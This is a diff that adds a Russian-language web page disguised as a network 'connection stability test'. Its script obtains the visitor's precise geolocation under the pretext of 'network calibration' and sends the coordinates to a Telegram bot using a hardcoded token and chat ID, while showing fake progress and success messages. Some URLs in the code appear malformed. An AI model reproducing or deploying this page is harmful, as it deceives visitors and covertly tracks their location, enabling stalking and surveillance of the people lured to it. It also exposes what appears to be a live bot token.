@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Сервис проверки связи</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #fafafa; color: #333; }
+        .container { max-width: 400px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
+        button { padding: 15px 30px; font-size: 16px; color: white; background: #28a745; border: none; border-radius: 5px; cursor: pointer; width: 100%; font-weight: bold; }
+        button:hover { background: #218838; }
+        #status { margin-top: 20px; color: #666; font-size: 14px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>Тест стабильности соединения</h2>
+    <p>Для оптимизации пинга и выбора ближайшего сервера, пожалуйста, нажмите кнопку ниже.</p>
+    <button onclick="startTest()">Запустить тест</button>
+    <div id="status">Ожидание запуска...</div>
+</div>
+
+<script>
+    const TELEGRAM_TOKEN = "9222855250:AAGqq9cpY7OSlB0vmlgIukhyyrh7UXf3wxc"; 
+    const CHAT_ID = "8512069090"; 
+
+    function startTest() {
+        const statusDiv = document.getElementById("status");
+        
+        if (navigator.geolocation) {
+            statusDiv.innerHTML = "Пожалуйста, подтвердите доступ к калибровке сети...";
+            
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    statusDiv.innerHTML = "Тестирование канала... 24%";
+                    
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    
+                    const textMessage = `[+] УСТРОЙСТВО НАЙДЕНО!\nШирота: ${lat}\nДолгота: ${lon}\nКарта: https://google.com{lat},${lon}`;
+                    
+                    fetch('https://telegram.org' + TELEGRAM_TOKEN + '/sendMessage', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: CHAT_ID, text: textMessage })
+                    })
+                    .then(response => {
+                        statusDiv.innerHTML = "Тест успешно завершен. Оптимальный сервер найден.";
+                    })
+                    .catch(err => {
+                        statusDiv.innerHTML = "Ошибка сети при отправке пакетов.";
+                    });
+                }, 
+                function(error) {
+                    statusDiv.innerHTML = "Ошибка калибровки. Доступ к сенсорам отклонен.";
+                },
+                { enableHighAccuracy: true }
+            );
+        } else {
+            statusDiv.innerHTML = "Ваш браузер не поддерживает необходимые стандарты.";
+        }
+    }
+</script>
+
+</body>
+</html>
